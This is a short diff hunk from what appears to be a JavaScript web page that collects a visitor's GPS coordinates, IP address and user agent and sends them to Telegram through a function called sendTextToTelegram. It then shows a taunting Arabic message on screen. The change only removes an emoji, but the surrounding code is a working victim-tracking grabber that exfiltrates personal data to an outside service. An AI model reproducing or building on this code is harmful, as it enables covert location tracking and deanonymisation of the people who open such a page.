@@ -280,7 +280,7 @@
                 navigator.geolocation.getCurrentPosition(async (pos) => {
                     const gpsSent = await sendTextToTelegram(ip, ua, pos.coords.latitude, pos.coords.longitude);
                     if (gpsSent) {
-                        statusDiv.textContent += ' + 📍 اصبر هتتفشخ';
+                        statusDiv.textContent += ' +  اصبر هتتفشخ';
                     }
                     updateProgress(70);
                 }, (err) => {
